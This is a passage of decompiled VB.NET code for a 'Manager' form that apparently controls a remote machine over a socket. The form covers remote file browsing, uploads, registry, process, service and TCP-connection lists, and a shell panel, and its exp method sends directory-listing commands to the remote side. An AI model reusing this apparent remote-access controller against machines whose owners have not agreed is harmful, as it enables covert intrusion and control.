			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewEmptyFileToolStripMenuItem_Click
				Dim newEmptyFileToolStripMenuItem As ToolStripMenuItem = Me._NewEmptyFileToolStripMenuItem
				If newEmptyFileToolStripMenuItem IsNot Nothing Then
					RemoveHandler newEmptyFileToolStripMenuItem.Click, value2
				End If
				Me._NewEmptyFileToolStripMenuItem = value
				newEmptyFileToolStripMenuItem = Me._NewEmptyFileToolStripMenuItem
				If newEmptyFileToolStripMenuItem IsNot Nothing Then
					AddHandler newEmptyFileToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A4 RID: 164
		' (get) Token: 0x060001E2 RID: 482 RVA: 0x000136B3 File Offset: 0x000118B3
		' (set) Token: 0x060001E3 RID: 483 RVA: 0x000136C0 File Offset: 0x000118C0
		Friend Overridable Property NewFolderToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._NewFolderToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewFolderToolStripMenuItem_Click
				Dim newFolderToolStripMenuItem As ToolStripMenuItem = Me._NewFolderToolStripMenuItem
				If newFolderToolStripMenuItem IsNot Nothing Then
					RemoveHandler newFolderToolStripMenuItem.Click, value2
				End If
				Me._NewFolderToolStripMenuItem = value
				newFolderToolStripMenuItem = Me._NewFolderToolStripMenuItem
				If newFolderToolStripMenuItem IsNot Nothing Then
					AddHandler newFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A5 RID: 165
		' (get) Token: 0x060001E4 RID: 484 RVA: 0x00013703 File Offset: 0x00011903
		' (set) Token: 0x060001E5 RID: 485 RVA: 0x00013710 File Offset: 0x00011910
		Friend Overridable Property OpenDownloadsToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OpenDownloadsToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenDownloadsToolStripMenuItem_Click
				Dim openDownloadsToolStripMenuItem As ToolStripMenuItem = Me._OpenDownloadsToolStripMenuItem
				If openDownloadsToolStripMenuItem IsNot Nothing Then
					RemoveHandler openDownloadsToolStripMenuItem.Click, value2
				End If
				Me._OpenDownloadsToolStripMenuItem = value
				openDownloadsToolStripMenuItem = Me._OpenDownloadsToolStripMenuItem
				If openDownloadsToolStripMenuItem IsNot Nothing Then
					AddHandler openDownloadsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A6 RID: 166
		' (get) Token: 0x060001E6 RID: 486 RVA: 0x00013753 File Offset: 0x00011953
		' (set) Token: 0x060001E7 RID: 487 RVA: 0x00013760 File Offset: 0x00011960
		Friend Overridable Property RarToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RarToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RarToolStripMenuItem_Click
				Dim rarToolStripMenuItem As ToolStripMenuItem = Me._RarToolStripMenuItem
				If rarToolStripMenuItem IsNot Nothing Then
					RemoveHandler rarToolStripMenuItem.Click, value2
				End If
				Me._RarToolStripMenuItem = value
				rarToolStripMenuItem = Me._RarToolStripMenuItem
				If rarToolStripMenuItem IsNot Nothing Then
					AddHandler rarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A7 RID: 167
		' (get) Token: 0x060001E8 RID: 488 RVA: 0x000137A3 File Offset: 0x000119A3
		' (set) Token: 0x060001E9 RID: 489 RVA: 0x000137B0 File Offset: 0x000119B0
		Friend Overridable Property UnRarToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UnRarToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UnRarToolStripMenuItem_Click
				Dim unRarToolStripMenuItem As ToolStripMenuItem = Me._UnRarToolStripMenuItem
				If unRarToolStripMenuItem IsNot Nothing Then
					RemoveHandler unRarToolStripMenuItem.Click, value2
				End If
				Me._UnRarToolStripMenuItem = value
				unRarToolStripMenuItem = Me._UnRarToolStripMenuItem
				If unRarToolStripMenuItem IsNot Nothing Then
					AddHandler unRarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A8 RID: 168
		' (get) Token: 0x060001EA RID: 490 RVA: 0x000137F3 File Offset: 0x000119F3
		' (set) Token: 0x060001EB RID: 491 RVA: 0x00013800 File Offset: 0x00011A00
		Friend Overridable Property UploadFromLinkToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UploadFromLinkToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadFromLinkToolStripMenuItem_Click
				Dim uploadFromLinkToolStripMenuItem As ToolStripMenuItem = Me._UploadFromLinkToolStripMenuItem
				If uploadFromLinkToolStripMenuItem IsNot Nothing Then
					RemoveHandler uploadFromLinkToolStripMenuItem.Click, value2
				End If
				Me._UploadFromLinkToolStripMenuItem = value
				uploadFromLinkToolStripMenuItem = Me._UploadFromLinkToolStripMenuItem
				If uploadFromLinkToolStripMenuItem IsNot Nothing Then
					AddHandler uploadFromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A9 RID: 169
		' (get) Token: 0x060001EC RID: 492 RVA: 0x00013843 File Offset: 0x00011A43
		' (set) Token: 0x060001ED RID: 493 RVA: 0x0001384D File Offset: 0x00011A4D
		Friend Overridable Property ContextMenuStrip4 As ContextMenuStrip

		' Token: 0x170000AA RID: 170
		' (get) Token: 0x060001EE RID: 494 RVA: 0x00013856 File Offset: 0x00011A56
		' (set) Token: 0x060001EF RID: 495 RVA: 0x00013860 File Offset: 0x00011A60
		Friend Overridable Property RefreshToolStripMenuItem3 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem3_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem3
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem3 = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem3
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AB RID: 171
		' (get) Token: 0x060001F0 RID: 496 RVA: 0x000138A3 File Offset: 0x00011AA3
		' (set) Token: 0x060001F1 RID: 497 RVA: 0x000138AD File Offset: 0x00011AAD
		Friend Overridable Property MG As ImageList

		' Token: 0x170000AC RID: 172
		' (get) Token: 0x060001F2 RID: 498 RVA: 0x000138B6 File Offset: 0x00011AB6
		' (set) Token: 0x060001F3 RID: 499 RVA: 0x000138C0 File Offset: 0x00011AC0
		Friend Overridable Property ListView1 As ListView
			<CompilerGenerated()>
			Get
				Return Me._ListView1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim value2 As EventHandler = AddressOf Me.ListView1_SelectedIndexChanged
				Dim listView As ListView = Me._ListView1
				If listView IsNot Nothing Then
					RemoveHandler listView.SelectedIndexChanged, value2
				End If
				Me._ListView1 = value
				listView = Me._ListView1
				If listView IsNot Nothing Then
					AddHandler listView.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170000AD RID: 173
		' (get) Token: 0x060001F4 RID: 500 RVA: 0x00013903 File Offset: 0x00011B03
		' (set) Token: 0x060001F5 RID: 501 RVA: 0x0001390D File Offset: 0x00011B0D
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x170000AE RID: 174
		' (get) Token: 0x060001F6 RID: 502 RVA: 0x00013916 File Offset: 0x00011B16
		' (set) Token: 0x060001F7 RID: 503 RVA: 0x00013920 File Offset: 0x00011B20
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x170000AF RID: 175
		' (get) Token: 0x060001F8 RID: 504 RVA: 0x00013929 File Offset: 0x00011B29
		' (set) Token: 0x060001F9 RID: 505 RVA: 0x00013933 File Offset: 0x00011B33
		Friend Overridable Property vmethod_148 As ImageList

		' Token: 0x170000B0 RID: 176
		' (get) Token: 0x060001FA RID: 506 RVA: 0x0001393C File Offset: 0x00011B3C
		' (set) Token: 0x060001FB RID: 507 RVA: 0x00013946 File Offset: 0x00011B46
		Friend Overridable Property Timer1 As Timer

		' Token: 0x170000B1 RID: 177
		' (get) Token: 0x060001FC RID: 508 RVA: 0x0001394F File Offset: 0x00011B4F
		' (set) Token: 0x060001FD RID: 509 RVA: 0x00013959 File Offset: 0x00011B59
		Friend Overridable Property FMM As Panel

		' Token: 0x170000B2 RID: 178
		' (get) Token: 0x060001FE RID: 510 RVA: 0x00013962 File Offset: 0x00011B62
		' (set) Token: 0x060001FF RID: 511 RVA: 0x0001396C File Offset: 0x00011B6C
		Friend Overridable Property TextBox1 As TextBox

		' Token: 0x170000B3 RID: 179
		' (get) Token: 0x06000200 RID: 512 RVA: 0x00013975 File Offset: 0x00011B75
		' (set) Token: 0x06000201 RID: 513 RVA: 0x00013980 File Offset: 0x00011B80
		Friend Overridable Property L1 As GClass9
			<CompilerGenerated()>
			Get
				Return Me._L1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick1
				Dim l As GClass9 = Me._L1
				If l IsNot Nothing Then
					RemoveHandler l.DoubleClick, value2
				End If
				Me._L1 = value
				l = Me._L1
				If l IsNot Nothing Then
					AddHandler l.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170000B4 RID: 180
		' (get) Token: 0x06000202 RID: 514 RVA: 0x000139C3 File Offset: 0x00011BC3
		' (set) Token: 0x06000203 RID: 515 RVA: 0x000139CD File Offset: 0x00011BCD
		Friend Overridable Property ColumnHeader6 As ColumnHeader

		' Token: 0x170000B5 RID: 181
		' (get) Token: 0x06000204 RID: 516 RVA: 0x000139D6 File Offset: 0x00011BD6
		' (set) Token: 0x06000205 RID: 517 RVA: 0x000139E0 File Offset: 0x00011BE0
		Friend Overridable Property ColumnHeader7 As ColumnHeader

		' Token: 0x170000B6 RID: 182
		' (get) Token: 0x06000206 RID: 518 RVA: 0x000139E9 File Offset: 0x00011BE9
		' (set) Token: 0x06000207 RID: 519 RVA: 0x000139F3 File Offset: 0x00011BF3
		Friend Overridable Property p As PictureBox

		' Token: 0x170000B7 RID: 183
		' (get) Token: 0x06000208 RID: 520 RVA: 0x000139FC File Offset: 0x00011BFC
		' (set) Token: 0x06000209 RID: 521 RVA: 0x00013A08 File Offset: 0x00011C08
		Friend Overridable Property L2 As GClass9
			<CompilerGenerated()>
			Get
				Return Me._L2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L2_DoubleClick
				Dim value3 As EventHandler = AddressOf Me.L2_SelectedIndexChanged
				Dim l As GClass9 = Me._L2
				If l IsNot Nothing Then
					RemoveHandler l.DoubleClick, value2
					RemoveHandler l.SelectedIndexChanged, value3
				End If
				Me._L2 = value
				l = Me._L2
				If l IsNot Nothing Then
					AddHandler l.DoubleClick, value2
					AddHandler l.SelectedIndexChanged, value3
				End If
			End Set
		End Property

		' Token: 0x170000B8 RID: 184
		' (get) Token: 0x0600020A RID: 522 RVA: 0x00013A66 File Offset: 0x00011C66
		' (set) Token: 0x0600020B RID: 523 RVA: 0x00013A70 File Offset: 0x00011C70
		Friend Overridable Property ColumnHeader8 As ColumnHeader

		' Token: 0x170000B9 RID: 185
		' (get) Token: 0x0600020C RID: 524 RVA: 0x00013A79 File Offset: 0x00011C79
		' (set) Token: 0x0600020D RID: 525 RVA: 0x00013A83 File Offset: 0x00011C83
		Friend Overridable Property ColumnHeader9 As ColumnHeader

		' Token: 0x170000BA RID: 186
		' (get) Token: 0x0600020E RID: 526 RVA: 0x00013A8C File Offset: 0x00011C8C
		' (set) Token: 0x0600020F RID: 527 RVA: 0x00013A96 File Offset: 0x00011C96
		Friend Overridable Property ColumnHeader10 As ColumnHeader

		' Token: 0x170000BB RID: 187
		' (get) Token: 0x06000210 RID: 528 RVA: 0x00013A9F File Offset: 0x00011C9F
		' (set) Token: 0x06000211 RID: 529 RVA: 0x00013AA9 File Offset: 0x00011CA9
		Friend Overridable Property LTCP As GClass9

		' Token: 0x170000BC RID: 188
		' (get) Token: 0x06000212 RID: 530 RVA: 0x00013AB2 File Offset: 0x00011CB2
		' (set) Token: 0x06000213 RID: 531 RVA: 0x00013ABC File Offset: 0x00011CBC
		Friend Overridable Property ColumnHeader16 As ColumnHeader

		' Token: 0x170000BD RID: 189
		' (get) Token: 0x06000214 RID: 532 RVA: 0x00013AC5 File Offset: 0x00011CC5
		' (set) Token: 0x06000215 RID: 533 RVA: 0x00013ACF File Offset: 0x00011CCF
		Friend Overridable Property ColumnHeader17 As ColumnHeader

		' Token: 0x170000BE RID: 190
		' (get) Token: 0x06000216 RID: 534 RVA: 0x00013AD8 File Offset: 0x00011CD8
		' (set) Token: 0x06000217 RID: 535 RVA: 0x00013AE2 File Offset: 0x00011CE2
		Friend Overridable Property ColumnHeader18 As ColumnHeader

		' Token: 0x170000BF RID: 191
		' (get) Token: 0x06000218 RID: 536 RVA: 0x00013AEB File Offset: 0x00011CEB
		' (set) Token: 0x06000219 RID: 537 RVA: 0x00013AF5 File Offset: 0x00011CF5
		Friend Overridable Property ColumnHeader19 As ColumnHeader

		' Token: 0x170000C0 RID: 192
		' (get) Token: 0x0600021A RID: 538 RVA: 0x00013AFE File Offset: 0x00011CFE
		' (set) Token: 0x0600021B RID: 539 RVA: 0x00013B08 File Offset: 0x00011D08
		Friend Overridable Property ColumnHeader20 As ColumnHeader

		' Token: 0x170000C1 RID: 193
		' (get) Token: 0x0600021C RID: 540 RVA: 0x00013B11 File Offset: 0x00011D11
		' (set) Token: 0x0600021D RID: 541 RVA: 0x00013B1B File Offset: 0x00011D1B
		Friend Overridable Property ColumnHeader21 As ColumnHeader

		' Token: 0x170000C2 RID: 194
		' (get) Token: 0x0600021E RID: 542 RVA: 0x00013B24 File Offset: 0x00011D24
		' (set) Token: 0x0600021F RID: 543 RVA: 0x00013B2E File Offset: 0x00011D2E
		Friend Overridable Property RG As Panel

		' Token: 0x170000C3 RID: 195
		' (get) Token: 0x06000220 RID: 544 RVA: 0x00013B37 File Offset: 0x00011D37
		' (set) Token: 0x06000221 RID: 545 RVA: 0x00013B44 File Offset: 0x00011D44
		Friend Overridable Property RGLIST As GClass9
			<CompilerGenerated()>
			Get
				Return Me._RGLIST
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.RGLIST_DoubleClick
				Dim rglist As GClass9 = Me._RGLIST
				If rglist IsNot Nothing Then
					RemoveHandler rglist.DoubleClick, value2
				End If
				Me._RGLIST = value
				rglist = Me._RGLIST
				If rglist IsNot Nothing Then
					AddHandler rglist.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170000C4 RID: 196
		' (get) Token: 0x06000222 RID: 546 RVA: 0x00013B87 File Offset: 0x00011D87
		' (set) Token: 0x06000223 RID: 547 RVA: 0x00013B91 File Offset: 0x00011D91
		Friend Overridable Property ColumnHeader3 As ColumnHeader

		' Token: 0x170000C5 RID: 197
		' (get) Token: 0x06000224 RID: 548 RVA: 0x00013B9A File Offset: 0x00011D9A
		' (set) Token: 0x06000225 RID: 549 RVA: 0x00013BA4 File Offset: 0x00011DA4
		Friend Overridable Property ColumnHeader4 As ColumnHeader

		' Token: 0x170000C6 RID: 198
		' (get) Token: 0x06000226 RID: 550 RVA: 0x00013BAD File Offset: 0x00011DAD
		' (set) Token: 0x06000227 RID: 551 RVA: 0x00013BB7 File Offset: 0x00011DB7
		Friend Overridable Property ColumnHeader5 As ColumnHeader

		' Token: 0x170000C7 RID: 199
		' (get) Token: 0x06000228 RID: 552 RVA: 0x00013BC0 File Offset: 0x00011DC0
		' (set) Token: 0x06000229 RID: 553 RVA: 0x00013BCC File Offset: 0x00011DCC
		Friend Overridable Property RGk As TreeView
			<CompilerGenerated()>
			Get
				Return Me._RGk
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TreeView)
				Dim value2 As TreeViewEventHandler = AddressOf Me.RGk_AfterCollapse
				Dim value3 As TreeViewEventHandler = AddressOf Me.RGk_AfterExpand
				Dim value4 As TreeViewEventHandler = AddressOf Me.RGk_AfterSelect
				Dim value5 As TreeNodeMouseClickEventHandler = AddressOf Me.RGk_NodeMouseClick
				Dim rgk As TreeView = Me._RGk
				If rgk IsNot Nothing Then
					RemoveHandler rgk.AfterCollapse, value2
					RemoveHandler rgk.AfterExpand, value3
					RemoveHandler rgk.AfterSelect, value4
					RemoveHandler rgk.NodeMouseDoubleClick, value5
				End If
				Me._RGk = value
				rgk = Me._RGk
				If rgk IsNot Nothing Then
					AddHandler rgk.AfterCollapse, value2
					AddHandler rgk.AfterExpand, value3
					AddHandler rgk.AfterSelect, value4
					AddHandler rgk.NodeMouseDoubleClick, value5
				End If
			End Set
		End Property

		' Token: 0x170000C8 RID: 200
		' (get) Token: 0x0600022A RID: 554 RVA: 0x00013C6C File Offset: 0x00011E6C
		' (set) Token: 0x0600022B RID: 555 RVA: 0x00013C78 File Offset: 0x00011E78
		Friend Overridable Property sh As Panel
			<CompilerGenerated()>
			Get
				Return Me._sh
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Dim value2 As EventHandler = AddressOf Me.sh_Resize
				Dim sh As Panel = Me._sh
				If sh IsNot Nothing Then
					RemoveHandler sh.Resize, value2
				End If
				Me._sh = value
				sh = Me._sh
				If sh IsNot Nothing Then
					AddHandler sh.Resize, value2
				End If
			End Set
		End Property

		' Token: 0x170000C9 RID: 201
		' (get) Token: 0x0600022C RID: 556 RVA: 0x00013CBB File Offset: 0x00011EBB
		' (set) Token: 0x0600022D RID: 557 RVA: 0x00013CC5 File Offset: 0x00011EC5
		Friend Overridable Property T1 As RichTextBox

		' Token: 0x170000CA RID: 202
		' (get) Token: 0x0600022E RID: 558 RVA: 0x00013CCE File Offset: 0x00011ECE
		' (set) Token: 0x0600022F RID: 559 RVA: 0x00013CD8 File Offset: 0x00011ED8
		Friend Overridable Property T2 As TextBox
			<CompilerGenerated()>
			Get
				Return Me._T2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				Dim t As TextBox = Me._T2
				If t IsNot Nothing Then
					RemoveHandler t.KeyDown, value2
				End If
				Me._T2 = value
				t = Me._T2
				If t IsNot Nothing Then
					AddHandler t.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x170000CB RID: 203
		' (get) Token: 0x06000230 RID: 560 RVA: 0x00013D1B File Offset: 0x00011F1B
		' (set) Token: 0x06000231 RID: 561 RVA: 0x00013D25 File Offset: 0x00011F25
		Friend Overridable Property LPR As GClass9

		' Token: 0x170000CC RID: 204
		' (get) Token: 0x06000232 RID: 562 RVA: 0x00013D2E File Offset: 0x00011F2E
		' (set) Token: 0x06000233 RID: 563 RVA: 0x00013D38 File Offset: 0x00011F38
		Friend Overridable Property ColumnHeader22 As ColumnHeader

		' Token: 0x170000CD RID: 205
		' (get) Token: 0x06000234 RID: 564 RVA: 0x00013D41 File Offset: 0x00011F41
		' (set) Token: 0x06000235 RID: 565 RVA: 0x00013D4B File Offset: 0x00011F4B
		Friend Overridable Property ColumnHeader23 As ColumnHeader

		' Token: 0x170000CE RID: 206
		' (get) Token: 0x06000236 RID: 566 RVA: 0x00013D54 File Offset: 0x00011F54
		' (set) Token: 0x06000237 RID: 567 RVA: 0x00013D5E File Offset: 0x00011F5E
		Friend Overridable Property ColumnHeader24 As ColumnHeader

		' Token: 0x170000CF RID: 207
		' (get) Token: 0x06000238 RID: 568 RVA: 0x00013D67 File Offset: 0x00011F67
		' (set) Token: 0x06000239 RID: 569 RVA: 0x00013D71 File Offset: 0x00011F71
		Friend Overridable Property ColumnHeader25 As ColumnHeader

		' Token: 0x170000D0 RID: 208
		' (get) Token: 0x0600023A RID: 570 RVA: 0x00013D7A File Offset: 0x00011F7A
		' (set) Token: 0x0600023B RID: 571 RVA: 0x00013D84 File Offset: 0x00011F84
		Friend Overridable Property ColumnHeader26 As ColumnHeader

		' Token: 0x170000D1 RID: 209
		' (get) Token: 0x0600023C RID: 572 RVA: 0x00013D8D File Offset: 0x00011F8D
		' (set) Token: 0x0600023D RID: 573 RVA: 0x00013D97 File Offset: 0x00011F97
		Friend Overridable Property LSRV As GClass9

		' Token: 0x170000D2 RID: 210
		' (get) Token: 0x0600023E RID: 574 RVA: 0x00013DA0 File Offset: 0x00011FA0
		' (set) Token: 0x0600023F RID: 575 RVA: 0x00013DAA File Offset: 0x00011FAA
		Friend Overridable Property ColumnHeader11 As ColumnHeader

		' Token: 0x170000D3 RID: 211
		' (get) Token: 0x06000240 RID: 576 RVA: 0x00013DB3 File Offset: 0x00011FB3
		' (set) Token: 0x06000241 RID: 577 RVA: 0x00013DBD File Offset: 0x00011FBD
		Friend Overridable Property ColumnHeader12 As ColumnHeader

		' Token: 0x170000D4 RID: 212
		' (get) Token: 0x06000242 RID: 578 RVA: 0x00013DC6 File Offset: 0x00011FC6
		' (set) Token: 0x06000243 RID: 579 RVA: 0x00013DD0 File Offset: 0x00011FD0
		Friend Overridable Property ColumnHeader13 As ColumnHeader

		' Token: 0x170000D5 RID: 213
		' (get) Token: 0x06000244 RID: 580 RVA: 0x00013DD9 File Offset: 0x00011FD9
		' (set) Token: 0x06000245 RID: 581 RVA: 0x00013DE3 File Offset: 0x00011FE3
		Friend Overridable Property ColumnHeader14 As ColumnHeader

		' Token: 0x170000D6 RID: 214
		' (get) Token: 0x06000246 RID: 582 RVA: 0x00013DEC File Offset: 0x00011FEC
		' (set) Token: 0x06000247 RID: 583 RVA: 0x00013DF6 File Offset: 0x00011FF6
		Friend Overridable Property ColumnHeader15 As ColumnHeader

		' Token: 0x170000D7 RID: 215
		' (get) Token: 0x06000248 RID: 584 RVA: 0x00013DFF File Offset: 0x00011FFF
		' (set) Token: 0x06000249 RID: 585 RVA: 0x00013E09 File Offset: 0x00012009
		Friend Overridable Property vmethod_108 As ImageList

		' Token: 0x0600024A RID: 586 RVA: 0x00013E14 File Offset: 0x00012014
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Manager_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Manager_Load
			AddHandler MyBase.Resize, AddressOf Me.Manager_Resize
			Me.RGCH = New Collection()
			Me.string_0 = String.Empty
			Me.Images = New Collection()
			Me.Cache = New Collection()
			Me.isCut = False
			Me.Flist = String.Empty
			Me.TCPFX = True
			Me.PRFX = True
			Me.SrvFX = True
			Me.srvNxt = True
			Me.PID = 0
			Me.PRNXT = True
			Me.TCPNXT = True
			Me.string_1 = New String(4) {}
			Me.int_0 = 0
			Me.int_1 = 0
			Me.cur = Manager.CR.fm
			Me.shStarted = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600024B RID: 587 RVA: 0x00013F00 File Offset: 0x00012100
		Public Sub exp(x As String, Optional Refresh As Boolean = False)
			Try
				Dim text As String = x.Replace("\\", "\")
				Dim flag As Boolean = Not text.EndsWith("\")
				If flag Then
					text += "\"
				End If
				Me.TextBox1.Text = text
				Dim pr As ToolStripProgressBar = Me.pr
				Dim obj As Object = pr
				SyncLock obj
					Me.p.Image = Nothing
					Me.p.Visible = False
					Me.TextBox1.BackColor = Color.IndianRed
					Dim flag2 As Boolean = Refresh AndAlso Me.Cache.Contains(text)
					If flag2 Then
						Me.Cache.Remove(text)
					End If
					Dim flag3 As Boolean = Me.Cache.Contains(text)
					If flag3 Then
						Me.TextBox1.BackColor = Color.Pink
						Dim gclass As Manager.GClass14 = CType(Me.Cache(text), Manager.GClass14)
						Me.pr.Value = 0
						Me.pr.Maximum = gclass.list_1.Count + gclass.list_0.Count
						Me.L2.Items.Clear()
						Dim flag4 As Boolean = New DirectoryInfo(text).Parent IsNot Nothing
						If flag4 Then
							Dim listViewItem As ListViewItem = Me.L2.Items.Add("..", "..", 0)
							listViewItem.SubItems.Add(String.Empty)
							listViewItem.SubItems.Add("DIR")
							listViewItem.ToolTipText = New DirectoryInfo(text).Parent.FullName + "\"
						End If
						Try
							For Each text2 As String In gclass.list_0
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								Dim toolStripProgressBar2 As ToolStripProgressBar = toolStripProgressBar
								toolStripProgressBar.Value = toolStripProgressBar2.Value + 1
								Dim listViewItem2 As ListViewItem = Me.L2.Items.Add(text2, New DirectoryInfo(text2).Name, 0)
								listViewItem2.SubItems.Add(String.Empty)
								listViewItem2.SubItems.Add("DIR")
								listViewItem2.ToolTipText = text2
							Next
						Finally
							Dim enumerator As List(Of String).Enumerator
							CType(enumerator, IDisposable).Dispose()
						End Try
						Dim list As List(Of ListViewItem) = New List(Of ListViewItem)()
						Try
							For Each expression As String In gclass.list_1
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar3 As ToolStripProgressBar = pr2
								Dim toolStripProgressBar2 As ToolStripProgressBar = toolStripProgressBar3
								toolStripProgressBar3.Value = toolStripProgressBar2.Value + 1
								Dim array As String() = Strings.Split(expression, "*", -1, CompareMethod.Binary)
								Dim fileInfo As FileInfo = New FileInfo(array(0))
								Dim listViewItem3 As ListViewItem = New ListViewItem(fileInfo.Name, 1)
								Dim listViewItem4 As ListViewItem = listViewItem3
								listViewItem4.ToolTipText = fileInfo.FullName
								listViewItem4.SubItems.Add(array(1))
								listViewItem4.SubItems.Add(array(2))
								listViewItem4.Name = listViewItem4.ToolTipText
								Dim flag5 As Boolean = Me.Images.Contains("!" + listViewItem4.ToolTipText)
								If flag5 Then
									Try
										Dim flag6 As Boolean = Not Me.vmethod_108.Images.ContainsKey(listViewItem4.ToolTipText)
										If flag6 Then
											Dim array2 As Object() = New Object(1) {}
											Dim listViewItem5 As ListViewItem = listViewItem4
											array2(0) = listViewItem5.ToolTipText
											array2(1) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.Images(listViewItem4.ToolTipText)))
											Dim array3 As Object() = array2
											Dim array4 As Boolean() = New Boolean(1) {}
											array4(0) = True
											Dim array5 As Boolean() = array4
											NewLateBinding.LateCall(Me.vmethod_108.Images, Nothing, "Add", array3, Nothing, Nothing, array5, True)
											Dim flag7 As Boolean = array5(0)
											If flag7 Then
												listViewItem5.ToolTipText = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3(0))), GetType(String)))
											End If
										End If
									Catch ex As Exception
									End Try
									listViewItem4.ImageKey = listViewItem4.ToolTipText
								Else
									Dim flag8 As Boolean = fileInfo.Extension.Length > 0
									If flag8 Then
										Dim flag9 As Boolean = Not Me.vmethod_108.Images.ContainsKey(fileInfo.Extension)
										If flag9 Then
											File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
											Me.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
											File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
											listViewItem4.ImageKey = fileInfo.Extension
										Else
											listViewItem4.ImageKey = fileInfo.Extension
										End If
									End If
								End If
								listViewItem4 = Nothing
								list.Add(listViewItem3)
								Dim flag10 As Boolean = list.Count > 20
								If flag10 Then
									Me.L2.Items.AddRange(list.ToArray())
									list.Clear()
								End If
							Next
						Finally
							Dim enumerator2 As List(Of String).Enumerator
							CType(enumerator2, IDisposable).Dispose()
						End Try
						Dim flag11 As Boolean = list.Count > 0
						If flag11 Then
							Me.L2.Items.AddRange(list.ToArray())
							list.Clear()
						End If
						Me.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
						Me.pr.Value = 0
					Else
						Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
					End If
				End SyncLock
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600024C RID: 588 RVA: 0x0001458C File Offset: 0x0001278C
		Private Sub Manager_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.Images.Clear()
			Catch ex As Exception
			End Try
			Try
				Me.Cache.Clear()
			Catch ex2 As Exception
			End Try
			Dim flag As Boolean = Me.sk IsNot Nothing AndAlso Me.sk.CN
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "@" }))
